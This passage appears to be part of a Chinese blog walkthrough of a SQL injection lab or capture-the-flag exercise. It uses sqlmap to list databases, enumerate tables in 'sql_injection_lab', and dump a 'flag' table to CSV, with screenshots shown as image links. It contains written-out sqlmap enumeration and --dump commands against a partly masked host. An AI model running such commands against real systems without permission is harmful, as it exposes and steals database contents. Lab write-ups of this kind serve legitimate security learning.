...
有效输出内容如图：
[![1.png](https://arthurserver.fnos.net/p/api/v1/stream/p/t/1263/m/c7955f7b-16b5-43ca-ab68-701bc23dfacb)](http://mrlee.w1.luyouxia.net/files/pic/blog1/1.jpeg "此图可以看到数据库信息")
本图中，可以确定：
...
有效输出内容截图：
[![2.png](https://arthurserver.fnos.net/p/api/v1/stream/p/t/1264/m/84d76795-d309-455f-b444-b969fb0c7ad0)](http://mrlee.w1.luyouxia.net/files/pic/blog1/2.jpeg "这里有6个数据库")
...
执行以下命令：
 ...
 有效内容截图如下：
[![3.png](https://arthurserver.fnos.net/p/api/v1/stream/p/t/1265/s/0722eb5d-5b95-4075-bc2d-887a5a097b3b)](http://mrlee.w1.luyouxia.net/files/pic/blog1/3.jpeg "报错了，因为找不到表")
 呃呃呃，看上去mydb的表内容是空的，那就可以直接更换目标了
` sqlmap -u "http://xxx.loveli.com.cn:8888/search?id=1" -D sql_injection_lab --tables`
 有效内容截图：
[![4.png](https://arthurserver.fnos.net/p/api/v1/stream/p/t/1266/s/3d4f7fa8-7eaf-4e05-a13d-076cecbc8b29)](http://mrlee.w1.luyouxia.net/files/pic/blog1/4.jpeg "找到了flag")
不错，找到我们要找的flag了，游戏要过关喽！
`sqlmap -u "http://xxx.loveli.com.cn:8888/search?id=1" -D sql_injection_lab -T flag --dump`
最终结果如图：
[![5.png](https://arthurserver.fnos.net/p/api/v1/stream/p/t/1267/s/52a48a02-506c-4b03-9e14-54f7d5be3dc2)](http://mrlee.w1.luyouxia.net/files/pic/blog1/5.jpeg "已获取到flag")
看！flag内容出现了！（我在后面几个字打码了）
而且--dump参数还能把该数据导出为csv文件，可以用任意表格软件打开，例如WPS:
[![6.png](https://arthurserver.fnos.net/p/api/v1/stream/p/t/1268/s/9b3ec909-1412-4938-a450-5f1820032547)](http://mrlee.w1.luyouxia.net/files/pic/blog1/6.jpeg "WPS读取SQLMap的导出文件")
SQLMap就这样，省去了我们苦苦查参数的时间
## 扩展（坑）
`sqlmap -u "http://xxx.loveli.com.cn:8888/search?id=1" -D sql_injection_lab -T flag --columns`
有效内容截图：
[![7.png](https://arthurserver.fnos.net/p/api/v1/stream/p/t/1269/s/b7bdc79d-4869-4571-8f70-d94dc7c54825)](http://mrlee.w1.luyouxia.net/files/pic/blog1/7.jpeg "并没有出现flag的具体值")
